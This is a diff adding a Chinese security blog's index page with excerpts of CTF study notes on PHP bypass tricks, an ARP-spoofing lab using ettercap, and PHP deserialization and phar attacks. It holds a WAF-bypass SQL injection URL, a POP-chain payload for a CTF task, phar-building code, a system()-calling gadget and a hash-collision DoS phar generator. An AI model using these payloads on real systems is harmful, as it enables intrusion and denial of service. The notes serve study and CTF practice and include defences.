+<li>OOB</li>
+</ul>
+</li>
+<li><p>XSS</p>
+<ul>
+<li>反射 XSS</li>
+<li>存储 XSS</li>
+<li>DOM-XSS</li>
+<li>CSP Bypass</li>
+<li>RPO</li>
+</ul>
+</li>
+<li><p>SSRF</p>
+<ul>
+<li>正则绕过</li>
+<li>302 Redirect</li>
+<li>DNS Rebinding</li>
+<li>Gopher</li>
+<li>FTP</li>
+</ul>
+</li>
+<li><p>RCE！！！！！</p>
+</li>
+<li><p>XXE</p>
+</li>
+<li><p>代码审计</p>
+<ul>
+<li>PHP<ul>
+<li>LFI</li>
+<li>反序列化</li>
+<li>文件上传</li>
+</ul>
+</li>
+<li>Python<ul>
+<li>SSTI</li>
+<li>反序列化</li>
+</ul>
+</li>
+<li>Nodejs<ul>
+<li>原型链污染</li>
+</ul>
+</li>
+<li>Java<ul>
+<li>反序列化</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>CSRF</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/08/24/概览/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/08/24/简单的php特性与绕过/">
+        <h2>
+            
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><pre><code>$_SERVER[&quot;QUERY_STRING&quot;]
+获取查询语句，实例中可知，获取的是?后面的值
+
+$_SERVER[&quot;REQUEST_URI&quot;]
+获取http://www.xxx.com或是http://localhost/后面的值，包括/
+
+$_SERVER[&quot;SCRIPT_NAME&quot;]
+获取当前脚本的路径，如：/index.php或/aaa/index.php
+
+$_SERVER[&quot;PHP_SELF&quot;]
+当前正在执行脚本的文件名
+
+与$_GET不同，$_SERVER不会转义url编码
+</code></pre>
+<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><pre><code>preg_match可以用来查找字符串。
+1，它不能处理数组，否则返回false
+2，如果使用正则表达式，由于其回溯次数是有限的，可以突破限制返回false。https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html
+3.如果使用正则表达式，.不会匹配换行符，可以用换行符截断绕过
+4.如果使用正则表达式，在非多行模式下（无/s），%0a等空白字符会被忽略
+</code></pre>
+<h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><pre><code>$_REQUEST是用户传入的GET,POST参数值。
+由于POST的优先级比GET高，所以当POST和GET存在相同的参数时，以POST为准
+</code></pre>
+<h2 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h2><p>加密函数，不支持加密数组，否则返回null</p>
+<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>读取文件，存在反序列化漏洞，支持伪协议</p>
+<p>如可以使用data伪协议指定返回的内容：data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aque</p>
+<p>指定内容为debu_debu_aque</p>
+<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><p>创建匿名函数。其问题在于太相信用户输入。</p>
+<p>如$code(‘’, $arg)</p>
+<p>其中$code,$arg均为用户输入</p>
+<p>对于$aaa &#x3D; create_function(‘$a, $b’, ‘return $a+$b;’);</p>
+<p>它相当于</p>
+<pre><code>function aaa($a, $b)&#123;
+    return $a+$b;
+&#125;
+</code></pre>
+<p>所以，如果$code&#x3D;create_function,$arg&#x3D;;}fction();<em>&#x2F;&#x2F;</em></p>
+<p>带入后</p>
+<pre><code>function 匿名()&#123;
+    return ;
+&#125;  
+fction();//&#125;
+</code></pre>
+<p>这样fction（）被执行</p>
+<h2 id="substr-count"><a href="#substr-count" class="headerlink" title="substr_count"></a>substr_count</h2><p>检查子串在字符串出现次数，区分大小写</p>
+<h2 id="GET-x2F-POST"><a href="#GET-x2F-POST" class="headerlink" title="GET&#x2F;POST"></a>GET&#x2F;POST</h2><p><strong>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</strong></p>
+<pre><code>/news.php?%20news[id%00=42&quot;+AND+1=0--
+</code></pre>
+<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
+<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
+<blockquote>
+<p>​    1.删除空白符</p>
+<p>​    2.将某些字符转换为下划线（包括空格）</p>
+</blockquote>
+<p><img src="/%E7%AE%80%E5%8D%95%E7%9A%84php%E7%89%B9%E6%80%A7%E4%B8%8E%E7%BB%95%E8%BF%87.assets/1567560448_5d6f13004035f.png" alt="img"></p>
+<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>[BJDCTF2020]EzPHP</p>
+<h2 id="其它笔记"><a href="#其它笔记" class="headerlink" title="其它笔记"></a>其它笔记</h2><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>用于批量给参数赋值。</p>
+<p>如：</p>
+<pre><code>$x=&#39;&#39;
+$y=&#39;&#39;
+$a[x]=1
+$a[y]=2
+extract($a)
+
+结果：x=1，y=2
+</code></pre>
+<h3 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h3><p>读取文件。与include功能相似。</p>
+<p>对 include() 语句来说，在执行文件时每次都要进行读取和评估；而对于 require() 来说，文件只处理一次（实际上，文件内容替换 require() 语句）。</p>
+<ul>
+<li><strong>incluce</strong> 在用到时加载</li>
+<li><strong>require</strong> 在一开始就加载</li>
+<li><strong>_once</strong> 后缀表示已加载的不加载</li>
+</ul>
+<h3 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h3><p>打印变量信息</p>
+<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>返回由所有已定义变量所组成的数组。</p>
+<p>可以配合var_dump()获取文件中关键词（读不了全部代码）</p>
+<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>该函数可以将传入的字符串在预定义字符之前添加反斜杠。</p>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+</ul>
+<p><strong>注释：</strong>默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/08/24/简单的php特性与绕过/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/08/24/五，arp欺骗/">
+        <h2>
+            
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>ARP协议是用来将逻辑地址转换为物理地址的协议，在计算机通信中有着举足轻重的作用。尽管ARP协议存在安全问题，但至今世界仍然使用该协议。</p>
+<p><img src="/%E4%BA%94%EF%BC%8Carp%E6%AC%BA%E9%AA%97.assets/1562727684_5d255504bf6c5.png!small" alt="ARP_normal.png"></p>
+<p>网上借的图。如图，正常的ARP通信应该是PC2广播ARP请求，询问IP地址为192.168.3.2的主机的MAC地址。 PC1收到广播帧，发出ARP应答，告诉PC2自己是192.168.3.2，MAC地址是aa:aa:aa:aa:aa:aa。</p>
+<p><img src="/%E4%BA%94%EF%BC%8Carp%E6%AC%BA%E9%AA%97.assets/1562727837_5d25559d28d3e.png!small" alt="ARP_Attack(单向).png"></p>
+<p>但如果如图，PC1广播ARP请求，询问IP地址为192.168.3.1的主机的MAC地址。 PC3收到广播帧，发出ARP应答，告诉PC1自己是192.168.3.1，MAC地址是cc:cc:cc:cc:cc:cc。（这之后，PC1发给PC2的所有流量都会发给PC3）。这是单向ARP欺骗</p>
+<p>双向ARP欺骗与单项ARP欺骗相似，PC1广播ARP请求，询问IP地址为192.168.3.1的主机的MAC地址。 PC3收到PC1的广播帧，发出ARP应答，告诉PC1自己是192.168.3.1，MAC地址是cc:cc:cc:cc:cc:cc。（这之后，PC1发给PC2的所有流量都会发给PC3） PC2广播ARP请求，询问IP地址为192.168.3.2的主机的MAC地址。 PC3收到PC2的广播帧，发出ARP应答，告诉PC1自己是192.168.3.2，MAC地址是cc:cc:cc:cc:cc:cc。（这之后，PC2发给PC1的所有流量都会发给PC3）</p>
+<h2 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h2><p>协议必备，不用判断</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可参考下文实验</p>
+<h2 id="漏洞绕过"><a href="#漏洞绕过" class="headerlink" title="漏洞绕过"></a>漏洞绕过</h2><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>清空ARP缓存后重新上网</p>
+<p>arp绑定。将ip与mac临时绑定</p>
+<p>杀毒软件和防火墙</p>
+<p>溯源：</p>
+<p>查看被欺骗主机的ARP缓存表，查看网关IP的MAC地址，之后到交换机上去查看对应该MAC的端口，就可以找到对应的“幕后黑手”了。</p>
+<h2 id="记一次简单的ARP欺骗实验"><a href="#记一次简单的ARP欺骗实验" class="headerlink" title="记一次简单的ARP欺骗实验"></a>记一次简单的ARP欺骗实验</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>攻击机：kali	192.168.123.101</p>
+<p>靶机：本人手机	192.168.123.141</p>
+<p>网关：192.168.123.1</p>
+<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>kali管理员终端运行ettercap -G命令启动ettercap</p>
+<p>选择本机网卡</p>
+<p>host扫描局域网内主机的ip和mac地址</p>
+<p><img src="/%E4%BA%94%EF%BC%8Carp%E6%AC%BA%E9%AA%97.assets/image-20220311154253716.png" alt="image-20220311154253716"></p>
+<p>找到靶机ip，添加到target1；找到网关ip，添加到target2.</p>
+<p>mitm菜单选择arp攻击，设置相关选项ok即可</p>
+<p><img src="/%E4%BA%94%EF%BC%8Carp%E6%AC%BA%E9%AA%97.assets/image-20220311154504149.png" alt="image-20220311154504149"></p>
+<p>稍等片刻后靶机无法上网（已经卡了5分钟了。。。）</p>
+<p><img src="/%E4%BA%94%EF%BC%8Carp%E6%AC%BA%E9%AA%97.assets/Screenshot_20220311_154533_tv.danmaku.bili.jpg" alt="Screenshot_20220311_154533_tv.danmaku.bili"></p>
+<p>我们可以看到拦截下的包</p>
+<p><img src="/%E4%BA%94%EF%BC%8Carp%E6%AC%BA%E9%AA%97.assets/image-20220311154630206.png" alt="image-20220311154630206"></p>
+<p>关闭攻击，稍等片刻（或重连）靶机恢复联网</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/207238.html">https://www.freebuf.com/articles/network/207238.html</a></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/08/24/五，arp欺骗/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/08/24/八，反序列化漏洞/">
+        <h2>
+            
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>序列化：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式。</p>
+<p>反序列化：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码（如Shiro 1.2.4），使用不安全的反序列化框架库（如Fastjson 1.2.24）或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的。</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>1.解析认证token、session的位置</p>
+<p>2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等</p>
+<p>3.将对象序列化后在网络中传输，如传输json数据，xml数据等</p>
+<p>4.参数传递给程序</p>
+<p>5.使用RMI协议，被广泛使用的RMI协议完全基于序列化</p>
+<p>6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等</p>
+<p>7.定义协议用来接收与发送原始的java对象</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><strong>函数</strong>：</p>
+<p><strong>serialize()</strong>:序列化函数</p>
+<p>注意：不同类型的对象序列化格式不同</p>
+<p>​	private属性：%00A%00name</p>
+<p>​	protected属性：%00*%00属性名</p>
+<p>​	如果序列化的对象含上述类型，记得传入参数时使用url编码</p>
+<p>**unserialize()**：反序列化函数</p>
+<p><strong>序列化字符含义</strong>：</p>
+<p>a - array                  b - boolean<br>d - double                 i - integer<br>o - common object          r - reference<br>s - string                 C - custom object<br>O - class                  N - null<br>R - pointer reference      U - unicode string</p>
+<p><strong>魔术方法</strong>：</p>
+<img src="八，反序列化漏洞.assets/image-20211006145311985.png" alt="image-20211006145311985" style="zoom:200%;" />
+
+<p>当PHP5&lt;5.6.25、PHP7&lt;7.0.1时，当成员属性数目大于实际数码时可绕过__wakeup方法（CVE-2016-7124）</p>
+<p><strong>PHP反序列化特性</strong></p>
+<p>PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾（字符串除外），并且是根据长度判断内容的。</p>
+<p> 在反序列的时候php会根据s所指定的字符长度去读取后面的字符。如果指定的长度错误则反序列化就会失败。</p>
+<p> 对类中不存在的属性也会进行反序列化。</p>
+<h4 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h4><p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的<code>unserialize</code>函数，最终导致一个在该应用范围内的任意PHP对象注入</p>
+<p><strong>反序列化的常见起点</strong></p>
+<p>__wakeup 一定会调用</p>
+<p>__destruct 一定会调用</p>
+<p>__toString 当一个对象被反序列化后又被当做字符串使用</p>
+<p><strong>反序列化的常见中间跳板</strong>:</p>
+<p>__toString 当一个对象被当做字符串使用</p>
+<p>__get 读取不可访问或不存在属性时被调用<br>__set 当给不可访问或不存在属性赋值时被调用</p>
+<p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func();</p>
+<p><strong>反序列化的常见终点</strong>:</p>
+<p>__call 调用不可访问或不存在的方法时被调用<br>call_user_func 一般php代码执行都会选择这里<br>call_user_func_array 一般php代码执行都会选择这里</p>
+<h4 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h4><p>经典的php反序列化考点</p>
+<p>形式是提供多个自定义php类，其中有多种魔术方法，要求根据条件构造php对象并序列化后作为输入</p>
+<p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p>
+<p>ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集<br>POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：&#96;进行反序列化的数据能够被用户输入所控制。</p>
+<h5 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h5><pre><code>&lt;?php  
+@error_reporting(1); 
+include &#39;flag.php&#39;;
+class baby 
+&#123;   
+    protected $skyobj;  
+    public $aaa;
+    public $bbb;
+    function __construct() 
+    &#123;      
+        $this-&gt;skyobj = new sec;
+    &#125;  
+    function __toString()      
+    &#123;          
+        if (isset($this-&gt;skyobj))  
+            return $this-&gt;skyobj-&gt;read();      
+    &#125;  
+&#125;  
+
+class cool 
+&#123;    
+    public $filename;     
+    public $nice;
+    public $amzing; 
+    function read()      
+    &#123;   
+        $this-&gt;nice = unserialize($this-&gt;amzing);
+        $this-&gt;nice-&gt;aaa = $sth;
+        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)
+        &#123;
+            $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        
+            if (file_get_contents($file))         
+            &#123;              
+                return file_get_contents($file); 
+            &#125;  
+            else 
+            &#123; 
+                return &quot;you must be joking!&quot;; 
+            &#125;    
+        &#125;
+    &#125;  
+&#125;  
+
+class sec 
+&#123;  
+    function read()     
+    &#123;          
+        return &quot;it&#39;s so sec~~&quot;;      
+    &#125;  
+&#125;  
+
+if (isset($_GET[&#39;data&#39;]))  
+&#123; 
+    $Input_data = unserialize($_GET[&#39;data&#39;]);
+    echo $Input_data; 
+&#125; 
+else 
+&#123; 
+    highlight_file(&quot;./index.php&quot;); 
+&#125; 
+?&gt;
+
+</code></pre>
+<p>payload</p>
+<pre><code>&lt;?php
+class baby 
+&#123;   
+    protected $skyobj;  
+    public $aaa;
+    public $bbb;
+    function __construct() 
+    &#123;      
+        $this-&gt;skyobj = new cool;//更改为cool类
+    &#125;  
+    function __toString()      
+    &#123;          
+        if (isset($this-&gt;skyobj))  
+            return $this-&gt;skyobj-&gt;read();      
+    &#125;  
+&#125;  
+
+class cool 
+&#123;    
+    public $filename=&#39;./flag.php&#39;;     
+    public $nice;
+    public $amzing=&#39;O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D
+&#39;; 
+    function read()      
+    &#123;   
+        $this-&gt;nice = unserialize($this-&gt;amzing);
+        $this-&gt;nice-&gt;aaa = $sth;
+    &#125;  
+&#125;  
+
+$a = new baby();
+$a-&gt;bbb =&amp;$a-&gt;aaa; 
+echo urlencode(serialize($a));
+</code></pre>
+<p>使用指针绕过未知参数$sth,保证aaa与bbb相同</p>
+<h4 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h4><p>phar是PHP中类似jar的一种打包文件，对于PHP5.3及更高版本默认支持该后缀文件，如果是想写入phar文件需将php.ini文件中的phar.readonly参数设为0</p>
+<h5 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h5><h6 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h6><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<h6 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a <strong>manifest</strong> describing the contents</h6><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方</p>
+<h6 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file <strong>contents</strong></h6><p>被压缩文件的内容</p>
+<h6 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)</h6><p>签名，放在文件末尾</p>
+<h5 id="生成phar包"><a href="#生成phar包" class="headerlink" title="生成phar包"></a>生成phar包</h5><pre><code>&lt;?php
+class TestObject &#123;
+&#125;//自定义构造
+
+$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为 phar
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置 stub，可添加文件头绕过部分文件类型检测
+
+$o = new TestObject();//自定义构造
+$o -&gt; data=&#39;cck&#39;;//自定义构造
+
+$phar-&gt;setMetadata($o); //将自定义的 meta-data 存入 manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+//签名自动计算
+$phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<h5 id="利用phar实现反序列化漏洞"><a href="#利用phar实现反序列化漏洞" class="headerlink" title="利用phar实现反序列化漏洞"></a>利用phar实现反序列化漏洞</h5><p>参数可控的情况下，配合phar:&#x2F;&#x2F;伪协议，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p>
+<p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将<code>meta-data</code>进行反序列化</p>
+<h6 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h6><p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220329165920646.png" alt="image-20220329165920646"></p>
+<p>都是文件函数</p>
+<p>都调用了<code>php_stream_locate_url_wrapper</code> 。这个函数的作用是通过url来找到对应的wrapper。我们可以看到，phar组件注册了<code>phar://</code>这个wrapper</p>
+<p>通过源码查找php_stream_open_wrapper，可知下列函数也会引发phar反序列化漏洞</p>
+<p>操作文件的<code>touch</code></p>
+<pre><code>### exif
+
+- `exif_thumbnail`
+- `exif_imagetype`
+
+### gd
+
+- `imageloadfont`
+- `imagecreatefrom***`
+
+### hash
+
+- `hash_hmac_file`
+- `hash_file`
+- `hash_update_file`
+- `md5_file`
+- `sha1_file`
+
+### file / url
+
+- `get_meta_tags`
+- `get_headers`
+
+### standard
+
+- `getimagesize`
+- `getimagesizefromstring`
+### zip/Bzip / Gzip
+    $zip = new ZipArchive();
+    $res = $zip-&gt;open(&#39;c.zip&#39;);
+    $zip-&gt;extractTo(&#39;phar://test.phar/test&#39;);
+    如果题目限制了，phar://不能出现在头几个字符
+    $z =&#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;
+当然，它同样适用于compress.zlib://
+</code></pre>
+<p>数据库？？！</p>
+<p><strong>Postgres</strong></p>
+<pre><code>&lt;?php
+$pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));
+@$pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar://test.phar/aa&#39;);
+</code></pre>
+<p>当然，<code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样也是能使用的，只是它们需要开启phar的写功能。</p>
+<p><strong>MySQL</strong></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/998/">https://paper.seebug.org/998/</a></p>
+<p>LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper</p>
+<pre><code>&lt;?php
+class A &#123;
+    public $s = &#39;&#39;;
+    public function __wakeup () &#123;
+        system($this-&gt;s);
+    &#125;
+&#125;
+$m = mysqli_init();
+mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
+$s = mysqli_real_connect($m, &#39;localhost&#39;, &#39;root&#39;, &#39;123456&#39;, &#39;easyweb&#39;, 3306);
+$p = mysqli_query($m, &#39;LOAD DATA LOCAL INFILE \&#39;phar://test.phar/test\&#39; INTO TABLE a  LINES TERMINATED BY \&#39;\r\n\&#39;  IGNORE 1 LINES;&#39;);
+</code></pre>
+<p>mysqld的配置</p>
+<pre><code>[mysqld]
+local-infile=1
+secure_file_priv=&quot;&quot;
+</code></pre>
+<h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><p>1.Phar文件要能上传到服务器端，如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数。<br>2.文件操作函数的参数可控，且phar:&#x2F;&#x2F;的三种特殊字符没有被过滤。<br>3.要有可用的魔术方法作为跳板，如eval($this -&gt; output)。</p>
+<h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h6><h5 id="将phar伪造成其它文件"><a href="#将phar伪造成其它文件" class="headerlink" title="将phar伪造成其它文件"></a>将phar伪造成其它文件</h5><p>phar识别只靠<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件</p>
+<h6 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h6><ol>
+<li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li>
+<li>严格检查上传文件的内容，而不是只检查文件头。</li>
+<li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
+<h5 id="利用phar实现PHP内核哈希表碰撞攻"><a href="#利用phar实现PHP内核哈希表碰撞攻" class="headerlink" title="利用phar实现PHP内核哈希表碰撞攻"></a>利用phar实现PHP内核哈希表碰撞攻</h5><p>相比于上一种利用方式，这种不需要苛刻的有可用的魔术方法的条件只需可控参数的文件操作函数的条件即可。<br>在PHP内核中，数组是以哈希表的方式实现的，攻击者可以通过巧妙的构造数组元素的key使哈希表退化成单链表（时间复杂度从O(1) &#x3D;&gt; O(n)）来触发拒绝服务攻击。</p>
+<p>生成恶意DoS phar文件。</p>
+<pre><code class="php">&lt;?php
+    $size= pow(2, 16);
+    $array = array();
+    for ($key = 0, $maxKey = ($size - 1) * $size; $key &lt;= $maxKey; $key += $size) &#123;
+        $array[$key] = 0;
+    &#125;
+    $obj = new stdClass;
+    $obj-&gt;dos = $array;
+
+    $phar = new Phar(&quot;dos.phar&quot;);
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);
+    $phar-&gt;setMetadata($obj);
+    $phar-&gt;addFromString(&quot;dos.txt&quot;, &quot;dos&quot;);
+    $phar-&gt;stopBuffering();
+
+?&gt;
+</code></pre>
+<p>PHP修复此漏洞的方式是限制通过$_GET或$_POST等方式传入的参数数量，但是如果PHP脚本通过json_decode()或unserialize()等方式获取参数，依然将受到此漏洞的威胁。</p>
+<h4 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h4><h5 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h5><p>（1）session概念</p>
+<p>PHP session时一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有界面使用。它每个访问或者创建都有唯一的id（UID），并基于这个UID来储存变量。UID储存在cookie中，或者通过URL来进行传导。</p>
+<p>（2）会话过程</p>
+<p>当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果请求中不包括会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中。当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送会话保存管理器来进行保存。</p>
+<p> 默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。可以通过调用函数<code>session_start()</code>来手动开始一个会话。如果配置项<code>session.auto_start</code>设置为1，那么请求开始的时候，会话会自动开始</p>
+<p>PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数<code>session_write_close()</code>来手动关闭会话</p>
